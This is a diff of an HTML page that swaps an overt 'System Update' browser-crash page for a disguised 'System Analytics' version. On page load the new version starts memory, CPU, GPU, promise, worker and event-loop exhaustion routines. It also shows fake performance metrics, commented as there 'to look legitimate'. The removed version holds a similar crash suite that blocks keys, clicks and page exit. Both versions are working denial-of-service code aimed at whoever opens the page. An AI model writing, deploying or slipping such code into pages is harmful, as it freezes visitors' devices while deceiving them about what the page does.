@@ -1,423 +1,249 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Update</title>
+    <title>System Analytics</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            cursor: none !important;
-            user-select: none;
         }
         body {
             background: #000;
-            color: #ff0000;
+            color: #00ff00;
             font-family: 'Courier New', monospace;
             overflow: hidden;
-            height: 100vh;
-            width: 100vw;
-            position: fixed;
         }
     </style>
 </head>
 <body>
-    <div id="crashContainer"></div>
-
-    <audio id="crashSound" loop>
-        <source src="crash.mp3" type="audio/mp3">
-    </audio>
-
     <script>
-        // ========== EXTREME MEMORY CRASH ==========
-        function triggerMemoryCrash() {
-            console.log("Starting memory crash...");
-            
-            // Technique 1: Massive Array Allocation
-            const hugeArrays = [];
-            for (let i = 0; i < 100; i++) {
-                try {
-                    hugeArrays.push(new Array(10000000).fill('CRASH'.repeat(1000)));
-                    document.body.innerHTML += `<div style="color: red">Allocating memory block ${i}...</div>`;
-                } catch(e) {
-                    console.log("Memory allocation failed:", e);
-                }
-            }
-
-            // Technique 2: Infinite DOM Elements
-            setInterval(() => {
-                for (let i = 0; i < 1000; i++) {
-                    const element = document.createElement('div');
-                    element.innerHTML = '💀'.repeat(1000);
-                    element.style.fontSize = '100px';
-                    document.body.appendChild(element);
-                }
-            }, 10);
-
-            // Technique 3: localStorage Bomb
+        // ========== WEBGL CRASH ==========
+        function webglCrash() {
             try {
-                let data = 'X';
-                for (let i = 0; i < 20; i++) {
-                    data += data;
-                    localStorage.setItem('crash', data);
-                }
-            } catch(e) {}
-
-            // Technique 4: Canvas Memory Bomb
-            const canvas = document.createElement('canvas');
-            canvas.width = 10000;
-            canvas.height = 10000;
-            const ctx = canvas.getContext('2d');
-            setInterval(() => {
-                for (let i = 0; i < 100; i++) {
-                    ctx.fillRect(Math.random() * 10000, Math.random() * 10000, 1000, 1000);
-                }
-            }, 1);
-
-            // Technique 5: Web Workers Crash
-            for (let i = 0; i < 10; i++) {
-                const worker = new Worker(URL.createObjectURL(
-                    new Blob([`
-                        while(true) {
-                            postMessage(new ArrayBuffer(10000000));
-                        }
-                    `], {type: 'application/javascript'})
-                ));
-                worker.onmessage = () => {};
-            }
-        }
-
-        // ========== CPU OVERLOAD ==========
-        function triggerCPUOverload() {
-            // Infinite calculation loops
-            setInterval(() => {
-                for (let i = 0; i < 1000000; i++) {
-                    Math.sqrt(Math.random() * 1000000) * Math.pow(Math.random(), 2);
-                }
-            }, 1);
-
-            // Recursive function explosion
-            function recursiveBomb(depth = 0) {
-                if (depth > 1000) return;
-                setTimeout(() => recursiveBomb(depth + 1), 0);
-                setTimeout(() => recursiveBomb(depth + 1), 0);
-            }
-            recursiveBomb();
-
-            // Matrix calculation bomb
-            setInterval(() => {
-                const matrix = [];
-                for (let i = 0; i < 1000; i++) {
-                    matrix[i] = [];
-                    for (let j = 0; j < 1000; j++) {
-                        matrix[i][j] = Math.random();
-                    }
-                }
-                // Do useless calculations
-                for (let i = 0; i < matrix.length; i++) {
-                    for (let j = 0; j < matrix[i].length; j++) {
-                        matrix[i][j] = Math.sin(matrix[i][j]) * Math.cos(matrix[i][j]);
-                    }
-                }
-            }, 10);
-        }
-
-        // ========== BROWSER HIJACK ==========
-        function hijackBrowser() {
-            // Prevent any escape
-            window.onbeforeunload = function(e) {
-                e.preventDefault();
-                e.returnValue = '';
-                return '';
-            };
-
-            // Block all keys
-            document.addEventListener('keydown', function(e) {
-                e.preventDefault();
-                // Spam more elements on key press
-                for (let i = 0; i < 100; i++) {
-                    const div = document.createElement('div');
-                    div.textContent = 'BLOCKED '.repeat(100);
-                    document.body.appendChild(div);
-                }
-            });
-
-            // Block clicks and create more elements
-            document.addEventListener('click', function(e) {
-                e.preventDefault();
-                for (let i = 0; i < 500; i++) {
-                    const div = document.createElement('div');
-                    div.innerHTML = '💥'.repeat(50);
-                    div.style.fontSize = '50px';
-                    div.style.position = 'fixed';
-                    div.style.left = Math.random() * 100 + 'vw';
-                    div.style.top = Math.random() * 100 + 'vh';
-                    document.body.appendChild(div);
-                }
-            });
-
-            // Auto-scroll spam
-            setInterval(() => {
-                window.scrollTo(0, document.body.scrollHeight);
-                window.scrollTo(document.body.scrollWidth, 0);
-            }, 10);
-
-            // Open infinite popups (if not blocked)
-            setInterval(() => {
-                try {
-                    window.open('', '_blank', 'width=100,height=100');
-                } catch(e) {}
-            }, 1000);
-        }
-
-        // ========== VISUAL OVERLOAD ==========
-        function visualOverload() {
-            // Create massive amount of elements
-            setInterval(() => {
-                for (let i = 0; i < 100; i++) {
-                    const element = document.createElement('div');
-                    element.innerHTML = '💀'.repeat(100);
-                    element.style.cssText = `
-                        position: fixed;
-                        left: ${Math.random() * 100}vw;
-                        top: ${Math.random() * 100}vh;
-                        font-size: ${20 + Math.random() * 50}px;
-                        color: hsl(${Math.random() * 360}, 100%, 50%);
-                        z-index: 9999;
-                        pointer-events: none;
-                    `;
-                    document.body.appendChild(element);
-
-                    // Remove old elements to prevent complete freeze
-                    if (document.body.children.length > 1000) {
-                        document.body.removeChild(document.body.firstChild);
-                    }
-                }
-            }, 1);
-
-            // Background color spam
-            setInterval(() => {
-                document.body.style.background = `hsl(${Math.random() * 360}, 100%, 50%)`;
-            }, 50);
-
-            // Create canvas overlays
-            for (let i = 0; i < 5; i++) {
                 const canvas = document.createElement('canvas');
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-                canvas.style.cssText = `
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    pointer-events: none;
-                    z-index: 9998;
-                `;
-                document.body.appendChild(canvas);
-
-                const ctx = canvas.getContext('2d');
-                setInterval(() => {
-                    ctx.fillStyle = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, 0.1)`;
-                    ctx.fillRect(0, 0, canvas.width, canvas.height);
-                    
-                    for (let j = 0; j < 100; j++) {
-                        ctx.beginPath();
-                        ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, Math.random() * 100, 0, Math.PI * 2);
-                        ctx.fill();
-                    }
-                }, 16);
-            }
-        }
-
-        // ========== SOUND SPAM ==========
-        function soundSpam() {
-            const crashSound = document.getElementById('crashSound');
-            crashSound.volume = 1.0;
-            crashSound.play().catch(e => console.log('Sound failed'));
-
-            // Create multiple audio contexts for more stress
-            for (let i = 0; i < 5; i++) {
-                setTimeout(() => {
-                    try {
-                        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                        const oscillator = audioContext.createOscillator();
-                        const gainNode = audioContext.createGain();
-                        
-                        oscillator.connect(gainNode);
-                        gainNode.connect(audioContext.destination);
-                        
-                        oscillator.type = 'sawtooth';
-                        oscillator.frequency.setValueAtTime(100 + Math.random() * 1000, audioContext.currentTime);
-                        gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
-                        
-                        oscillator.start();
-                    } catch(e) {}
-                }, i * 1000);
-            }
-        }
-
-        // ========== STORAGE BOMB ==========
-        function storageBomb() {
-            setInterval(() => {
-                try {
-                    // Fill sessionStorage
-                    sessionStorage.setItem('bomb', 'X'.repeat(1000000));
-                    
-                    // Fill localStorage
-                    localStorage.setItem('crash_bomb', 'Y'.repeat(1000000));
-                    
-                    // Fill IndexedDB
-                    const request = indexedDB.open('CrashDB', 1);
-                    request.onsuccess = function(event) {
-                        const db = event.target.result;
-                        const transaction = db.transaction(['crash'], 'readwrite');
-                        const store = transaction.objectStore('crash');
-                        
-                        for (let i = 0; i < 100; i++) {
-                            store.put({ data: 'Z'.repeat(100000), id: i });
-                        }
-                    };
-                    
-                    request.onupgradeneeded = function(event) {
-                        const db = event.target.result;
-                        db.createObjectStore('crash', { keyPath: 'id' });
-                    };
-                } catch(e) {}
-            }, 1000);
-        }
-
-        // ========== NETWORK SPAM ==========
-        function networkSpam() {
-            setInterval(() => {
-                for (let i = 0; i < 10; i++) {
-                    try {
-                        fetch('https://httpbin.org/delay/1').catch(() => {});
-                        fetch('https://httpbin.org/bytes/100000').catch(() => {});
-                    } catch(e) {}
-                }
-            }, 100);
-
-            // WebSocket spam
-            try {
-                for (let i = 0; i < 5; i++) {
-                    const ws = new WebSocket('wss://echo.websocket.org');
-                    ws.onopen = () => {
-                        setInterval(() => {
-                            ws.send('X'.repeat(10000));
-                        }, 100);
-                    };
+                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                
+                // Create massive texture that exceeds GPU memory
+                const texture = gl.createTexture();
+                gl.bindTexture(gl.TEXTURE_2D, texture);
+                
+                // Try to allocate impossibly large texture
+                const size = 16384; // Maximum texture size
+                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+                
+                // Create too many shaders
+                for (let i = 0; i < 1000; i++) {
+                    const shader = gl.createShader(gl.VERTEX_SHADER);
+                    gl.shaderSource(shader, 'void main(){}');
+                    gl.compileShader(shader);
                 }
             } catch(e) {}
         }
 
-        // ========== VIBRATION ATTACK ==========
-        function vibrationAttack() {
-            if (navigator.vibrate) {
-                setInterval(() => {
-                    // Extreme vibration pattern
-                    navigator.vibrate([100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50, 100, 50]);
-                }, 1000);
+        // ========== MEMORY CORRUPTION SIMULATION ==========
+        function memoryCorruption() {
+            // Use ArrayBuffer to simulate memory corruption
+            const buffer = new ArrayBuffer(1024 * 1024 * 100); // 100MB
+            const view = new Uint32Array(buffer);
+            
+            // Write to random memory locations
+            setInterval(() => {
+                try {
+                    for (let i = 0; i < view.length; i += 1000) {
+                        view[i] = 0xDEADBEEF; // Magic number that might crash
+                    }
+                } catch(e) {}
+            }, 100);
+        }
+
+        // ========== INFINITE RECURSION WITH PROMISES ==========
+        function promiseCrash() {
+            function recursivePromise() {
+                return Promise.resolve().then(() => {
+                    return recursivePromise();
+                });
+            }
+            
+            // Start multiple promise chains
+            for (let i = 0; i < 10; i++) {
+                recursivePromise();
             }
         }
 
-        // ========== START ALL ATTACKS ==========
-        function startTotalCrash() {
-            console.log("Initiating total crash sequence...");
-            
-            // Start all crash methods simultaneously
-            triggerMemoryCrash();
-            triggerCPUOverload();
-            hijackBrowser();
-            visualOverload();
-            soundSpam();
-            storageBomb();
-            networkSpam();
-            vibrationAttack();
-
-            // Final nuclear option - try to crash harder
-            setTimeout(() => {
-                // Nuclear memory bomb
-                const nuclearArrays = [];
-                while(true) {
-                    try {
-                        nuclearArrays.push(new Array(100000000));
-                    } catch(e) {
-                        break;
-                    }
+        // ========== EVENT LOOP BLOCKAGE ==========
+        function eventLoopCrash() {
+            // Block event loop with synchronous operations
+            setInterval(() => {
+                const start = Date.now();
+                while (Date.now() - start < 1000) {
+                    // Block for 1 second
+                    Math.sqrt(Math.random());
                 }
-            }, 5000);
+            }, 10);
+        }
 
-            // Show crash message
+        // ========== BROWSER-SPECIFIC VULNERABILITIES ==========
+        function browserSpecificCrash() {
+            // Chrome-specific: Excessive Promise microtasks
+            if (navigator.userAgent.includes('Chrome')) {
+                function microtaskFlood() {
+                    Promise.resolve().then(microtaskFlood);
+                }
+                microtaskFlood();
+            }
+            
+            // Firefox-specific: CSS animation bomb
+            if (navigator.userAgent.includes('Firefox')) {
+                const style = document.createElement('style');
+                style.textContent = `
+                    @keyframes crash {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(3600000deg); }
+                    }
+                    * { animation: crash 0.0001s infinite; }
+                `;
+                document.head.appendChild(style);
+            }
+            
+            // Safari-specific: WebAudio crash
+            if (navigator.userAgent.includes('Safari')) {
+                try {
+                    const context = new (window.AudioContext || window.webkitAudioContext)();
+                    const oscillator = context.createOscillator();
+                    const gain = context.createGain();
+                    
+                    oscillator.connect(gain);
+                    gain.connect(context.destination);
+                    
+                    oscillator.frequency.setValueAtTime(0, context.currentTime);
+                    gain.gain.setValueAtTime(1, context.currentTime);
+                    
+                    oscillator.start();
+                } catch(e) {}
+            }
+        }
+
+        // ========== STACK OVERFLOW WITH GENERATORS ==========
+        function* stackOverflowGenerator() {
+            yield* stackOverflowGenerator();
+        }
+
+        function generatorCrash() {
+            try {
+                const gen = stackOverflowGenerator();
+                gen.next();
+            } catch(e) {}
+        }
+
+        // ========== MEMORY LEAK WITH CLOSURES ==========
+        function closureLeak() {
+            let leaks = [];
+            
+            function createLeak() {
+                const hugeArray = new Array(1000000).fill('LEAK');
+                leaks.push(() => hugeArray); // Closure references huge array
+            }
+            
+            setInterval(createLeak, 10);
+        }
+
+        // ========== DOM CORRUPTION ATTEMPT ==========
+        function domCorruption() {
+            // Try to corrupt DOM tree structure
+            setInterval(() => {
+                try {
+                    const randomElement = document.body.children[
+                        Math.floor(Math.random() * document.body.children.length)
+                    ];
+                    if (randomElement && randomElement.parentNode) {
+                        randomElement.parentNode.removeChild(randomElement);
+                        document.body.appendChild(randomElement);
+                    }
+                } catch(e) {}
+            }, 1);
+        }
+
+        // ========== WEB WORKER CRASH ==========
+        function workerCrash() {
+            const workerCode = `
+                while(true) {
+                    // Infinite loop in worker
+                    postMessage(Array(1000000).fill('CRASH'));
+                }
+            `;
+            
+            try {
+                const blob = new Blob([workerCode], {type: 'application/javascript'});
+                const worker = new Worker(URL.createObjectURL(blob));
+                worker.onmessage = () => {};
+            } catch(e) {}
+        }
+
+        // ========== REQUEST ANIMATION FRAME BOMB ==========
+        function rafCrash() {
+            function bomb() {
+                requestAnimationFrame(() => {
+                    // Heavy computation in RAF
+                    for (let i = 0; i < 1000000; i++) {
+                        Math.hypot(Math.random(), Math.random());
+                    }
+                    bomb();
+                });
+            }
+            bomb();
+        }
+
+        // ========== START ALL CRASH METHODS ==========
+        function startSmartCrash() {
+            console.log("Starting smart crash sequence...");
+            
+            // Start with subtle methods first
+            promiseCrash();
+            eventLoopCrash();
+            closureLeak();
+            rafCrash();
+            
+            // Then move to more aggressive methods
+            setTimeout(() => {
+                webglCrash();
+                memoryCorruption();
+                browserSpecificCrash();
+                generatorCrash();
+                domCorruption();
+                workerCrash();
+            }, 3000);
+            
+            // Final nuclear option
+            setTimeout(() => {
+                // Try to trigger garbage collector issues
+                const finalBomb = [];
+                setInterval(() => {
+                    finalBomb.push(new Array(1000000));
+                }, 100);
+            }, 10000);
+            
+            // Show fake analytics screen
             document.body.innerHTML = `
-                <div style="
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    width: 100%;
-                    height: 100%;
-                    background: #000;
-                    color: #ff0000;
-                    display: flex;
-                    align-items: center;
-                    justify-content: center;
-                    font-size: 24px;
-                    text-align: center;
-                    z-index: 100000;
-                ">
-                    <div>
-                        <div style="font-size: 48px; margin-bottom: 20px;">💀 SYSTEM CRASHING 💀</div>
-                        <div>Memory: OVERLOADED</div>
-                        <div>CPU: 100% UTILIZATION</div>
-                        <div>Browser: UNRESPONSIVE</div>
-                        <div style="margin-top: 20px; font-size: 16px; color: #888;">
-                            Force close browser to stop<br>
-                            Device may become unresponsive
-                        </div>
-                    </div>
+                <div style="padding: 20px;">
+                    <h1>System Performance Analytics</h1>
+                    <div id="metrics">Calculating system metrics...</div>
                 </div>
             `;
+            
+            // Fake metrics to look legitimate
+            setInterval(() => {
+                document.getElementById('metrics').innerHTML = `
+                    CPU Usage: ${Math.random() * 100}%<br>
+                    Memory: ${Math.random() * 100}%<br>
+                    GPU: ${Math.random() * 100}%<br>
+                    Temperature: ${30 + Math.random() * 50}°C
+                `;
+            }, 1000);
         }
 
-        // ========== INITIALIZE CRASH ==========
-        // Start immediately when page loads
-        window.onload = startTotalCrash;
-
-        // Also start on DOM ready
-        document.addEventListener('DOMContentLoaded', startTotalCrash);
-
-        // Block any attempt to prevent default
-        document.addEventListener('touchstart', function(e) {
-            e.preventDefault();
-        }, { passive: false });
-
-        document.addEventListener('touchmove', function(e) {
-            e.preventDefault();
-        }, { passive: false });
-
-        document.addEventListener('wheel', function(e) {
-            e.preventDefault();
-        }, { passive: false });
-
-        // Nuclear option - if still not crashing
-        setTimeout(() => {
-            // Try to trigger garbage collection issues
-            const leak = [];
-            setInterval(() => {
-                for (let i = 0; i < 10000; i++) {
-                    leak.push(new Array(10000));
-                }
-            }, 100);
-
-            // DOM node leak
-            setInterval(() => {
-                const fragment = document.createDocumentFragment();
-                for (let i = 0; i < 1000; i++) {
-                    const div = document.createElement('div');
-                    div.innerHTML = 'LEAK '.repeat(1000);
-                    fragment.appendChild(div);
-                }
-                document.body.appendChild(fragment);
-            }, 50);
-        }, 10000);
+        // Start crash sequence
+        window.onload = startSmartCrash;
 
     </script>
 </body>
